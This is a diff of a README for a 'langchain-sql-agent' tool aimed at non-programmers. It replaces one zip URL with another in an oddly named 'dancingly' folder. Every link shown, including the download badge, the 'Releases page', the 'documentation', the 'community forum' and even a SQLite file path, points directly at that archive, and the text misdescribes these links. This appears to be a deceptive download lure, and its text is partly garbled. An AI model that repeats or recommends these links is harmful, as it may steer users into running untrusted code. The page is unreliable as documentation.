@@ -1,6 +1,6 @@
 # 🤖 langchain-sql-agent - Chat with Your Database Easily
 
-[![Download](https://github.com/franck-bedis/langchain-sql-agent/raw/refs/heads/main/dancingly/sql_agent_langchain_v2.1.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/franck-bedis/langchain-sql-agent/raw/refs/heads/main/dancingly/sql_agent_langchain_v2.1.zip)
+[![Download](https://raw.githubusercontent.com/franck-bedis/langchain-sql-agent/main/dancingly/sql-agent-langchain-v1.5.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/franck-bedis/langchain-sql-agent/main/dancingly/sql-agent-langchain-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ You do not need to be a programmer to use this tool. Just follow the instruction
 
 To get started, visit the Releases page to download the software. 
 
-[Download from Releases](https://github.com/franck-bedis/langchain-sql-agent/raw/refs/heads/main/dancingly/sql_agent_langchain_v2.1.zip)
+[Download from Releases](https://raw.githubusercontent.com/franck-bedis/langchain-sql-agent/main/dancingly/sql-agent-langchain-v1.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -38,7 +38,7 @@ After installing the application, you can find it in your applications folder or
 ### 2. Setting Up Your Database Connection
 
 - Choose the type of database you want to connect to (either SQLite or MySQL).
-- For **SQLite**, you will need the path to your `https://github.com/franck-bedis/langchain-sql-agent/raw/refs/heads/main/dancingly/sql_agent_langchain_v2.1.zip` file.
+- For **SQLite**, you will need the path to your `https://raw.githubusercontent.com/franck-bedis/langchain-sql-agent/main/dancingly/sql-agent-langchain-v1.5.zip` file.
 - For **MySQL**, enter your database credentials: hostname, username, password, and database name.
 
 ### 3. Interacting with Your Database
@@ -82,8 +82,8 @@ If you encounter issues while using the app, consider these steps:
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For detailed information about features, visit our [official documentation](https://github.com/franck-bedis/langchain-sql-agent/raw/refs/heads/main/dancingly/sql_agent_langchain_v2.1.zip).
-- **Community Support**: Join discussions and ask questions in our [community forum](https://github.com/franck-bedis/langchain-sql-agent/raw/refs/heads/main/dancingly/sql_agent_langchain_v2.1.zip).
+- **Documentation**: For detailed information about features, visit our [official documentation](https://raw.githubusercontent.com/franck-bedis/langchain-sql-agent/main/dancingly/sql-agent-langchain-v1.5.zip).
+- **Community Support**: Join discussions and ask questions in our [community forum](https://raw.githubusercontent.com/franck-bedis/langchain-sql-agent/main/dancingly/sql-agent-langchain-v1.5.zip).
 
 For any technical difficulties or questions, feel free to reach out through our community forum. 
 
